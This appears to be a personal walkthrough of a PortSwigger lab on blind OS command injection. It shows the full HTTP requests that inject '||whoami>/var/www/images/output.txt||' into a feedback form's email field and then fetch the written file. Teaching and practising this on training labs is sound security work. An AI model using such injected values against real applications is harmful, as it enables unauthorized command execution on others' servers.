
# #PortSwigger 



![[Pasted image 20251215111000.png]]


## Lab Description

This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details, but the output is not returned in the response.

**Objective:** Execute the `whoami` command and retrieve the output.

**Key information:**
- Writable folder: `/var/www/images/`
- Files in this folder are served as product images
- Output redirection can capture command results

---
---


### Step 1: Capture the Feedback Request

1. In Burp's browser, access the lab
2. Use the **feedback** feature (usually at the bottom of the page)
3. Fill in the form and submit it
4. In Burp Proxy, find the `POST /feedback/submit` request
5. Send it to Repeater

**Example request:**
```
POST /feedback/submit HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&name=test&email=test%40test.com&subject=test&message=test
```


![[Pasted image 20251215144212.png]]

![[Pasted image 20251215144403.png]]


---

### Step 2: Inject the Command

Modify the `email` parameter:

**Original:**
```
email=test%40test.com
```

**Modified (with output redirection):**
```
email=test%40test.com||whoami>/var/www/images/output.txt||
```

**Full request:**
```
POST /feedback/submit HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&name=test&email=test%40test.com||whoami>/var/www/images/output.txt||&subject=test&message=test
```

**What this does:**
- `||` → OR operator (executes if the previous command fails)
- `whoami` → The command to execute
- `>` → Redirects output to a file    
- `/var/www/images/output.txt` → The output file location


![[Pasted image 20251215144752.png]]


---

### Step 3: Send the Request

1. Click **Send** in Repeater
2. The command is executed in the background
3. The output is written to `/var/www/images/output.txt`


---

### Step 4: Retrieve the Output

1. In Burp, find a request that loads a product image:
```
GET /images/product1.jpg HTTP/1.1
```

2. Send it to Repeater


![[Pasted image 20251215145037.png]]

3. Change the `filename` parameter to `output.txt`:
```
GET /images/output.txt HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

4. Send the request

**Response:**
```
peter
```


![[Pasted image 20251215144823.png]]


---
### Step 5: Lab Solved

![[Pasted image 20251215144854.png]]


---
---

